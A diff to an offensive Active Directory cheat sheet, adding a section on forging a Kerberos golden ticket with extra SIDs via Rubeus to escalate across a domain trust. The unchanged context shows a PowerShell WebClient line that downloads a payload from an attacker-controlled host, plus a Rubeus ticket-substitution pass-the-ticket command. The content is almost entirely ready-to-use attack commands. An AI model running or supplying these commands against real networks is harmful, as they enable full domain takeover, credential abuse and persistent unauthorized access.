@@ -46,3 +46,8 @@ $data = (New-Object System.Net.WebClient).DownloadData('http://<local_ip>:<port|
 .\Rubeus.exe tgssub /ticket:<kirbi_path_or_b64_blob> /altservice:<service|cifs>/<target>  /nowrap /ptt
 ```
 
+## golden - with extra_sid
+enter-pssession dst_domain_computer_fqdn
+```powershell
+ .\Rubeus.exe golden /user:Administrator /domain:<src_domain_fqdn> /sid:src_domain_sid> /sids:<dst_domain_sid>-<rid> /rc4:<src_krbtgt_nthash> /ptt
+```
